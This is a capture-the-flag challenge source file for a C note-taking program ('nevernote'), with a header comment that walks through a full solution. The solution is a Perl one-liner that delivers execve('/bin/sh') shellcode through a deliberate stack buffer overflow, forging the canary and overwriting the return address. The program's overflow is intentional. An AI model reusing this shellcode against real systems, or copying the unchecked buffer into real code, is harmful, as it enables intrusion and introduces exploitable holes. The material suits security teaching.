/*
** Solution
** pico4180@shell:/home/nevernote$ (echo "Remi"; echo "add_note"; perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" . "A"x467 . "\xeb\x16\x5b\x31" . "\x50\xc0\x04\x08" . "A"x12 . "Z"x4 . "\x24\xd4\xff\xff" . "\x50\xc0\x04\x08" . "\x00"' ; cat) |./nevernote
**
** This one is a little tricky.
** Indeed, the function verify_canary free the verify value, allocated on the heap.
** If we provide an address located on the stack, we will get an invalid free and the exploit is gonna fail.
** Therefore, we will use the new_note pointer as the verify pointer.
**
** echo "Remi"; 
** echo "add_note"; 
** perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" 
** . "A"x467            # The buffer "temporary.buff" is 512 bytes long. The first 45 bytes are the shellcode. It is then filled up with 467 bytes of garbage (45 + 467 = 512) 
** . "\xeb\x16\x5b\x31" # We override the canary value "temporary.canary.can", with the 4st byte of the shellcode
** . "\x50\xc0\x04\x08" # We override the verify pointer "temporary.canary.verfiy", with the address of the new_note variable, allocated in add_note
** . "A"x12             # There is 12 bytes of padding between the verify pointer and the top of the stack
** . "Z"x4              # We override the epb pointer
** . "\x24\xd4\xff\xff" # We override the eip pointer, so that it points to the buffer "temporary.buff", which contains our shellcode :)
** . "\x50\xc0\x04\x08" # We restore the dest pointer (the copy of the new_note pointer), otherwise it will by overrided with the NULL byte from strncpy
** . "\x00"'; 
** cat) 
** |./nevernote
** 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "canary.h"

#define NOTE_SIZE 1024

bool get_note(char *dest){
    struct safe_buffer temporary;
    bool valid;

    get_canary(&temporary.can);

    printf("Write your note: ");
    fflush(stdout);
    fgets(temporary.buf, NOTE_SIZE, stdin);

    // disallow some characters
    if (strchr(temporary.buf, '\t') || strchr(temporary.buf, '\r')){
        valid = false;
    }else{
        valid = true;
        strncpy(dest, temporary.buf, NOTE_SIZE);
    }

    verify_canary(&temporary.can);

    return valid;
}

void add_note(char *path){
    char *new_note = (char *)malloc(NOTE_SIZE);

    if (get_note(new_note) == true){ //note passed the check
        FILE *f;

        if ((f = fopen(path, "a")) == NULL){
            puts("Cannot write note.");
            fflush(stdout);
            free(new_note);
            exit(1);
        }

        fputs(new_note, f);
        fclose(f);

        puts("Note added.");
        fflush(stdout);
    }else{
        puts("Your note contained invalid characters. Please try again.");
        fflush(stdout);
    }

    free(new_note);
}

void view_notes(char *path){
    FILE *f;
    char note[NOTE_SIZE];

    if ((f = fopen(path, "r")) == NULL){
        puts("Cannot read notes.");
        fflush(stdout);
    }

    while (fgets(note, NOTE_SIZE, f) != NULL){
        puts(note);
        fflush(stdout);
    }

    fclose(f);
}

void command_loop(){
    char name[64];
    char command[16];
    char *note_file_path;

    printf("Please enter your name: ");
    fflush(stdout);
    fgets(name, 64, stdin);
    name[strcspn(name, "\n")] = '\0';

    if (strchr(name, '.') || strchr(name, '/')){
        printf("Bad character in name!\n");
        return;
    }

    note_file_path = (char *)malloc(strlen(name)+64);
    sprintf(note_file_path, "/home/nevernote/notes/%s", name);

    while (true){
        printf("Enter a command: ");
        fflush(stdout);
        if (fgets(command, 16, stdin) == NULL) goto exit;

        switch (command[0]){
            case 'a':
            case 'A':
                add_note(note_file_path);
                break;
            case 'v':
            case 'V':
                view_notes(note_file_path);
                break;
            case 'q':
            case 'Q':
                goto exit;
            default:
                puts("Commands: [a]dd_note, [v]iew_notes, [q]uit");
                fflush(stdout);
                break;
        }
    }

exit:
    free(note_file_path);
    return;
}

int main(int argc, char **argv){
    register_segfault_handler();
    command_loop();

    return 0;
}
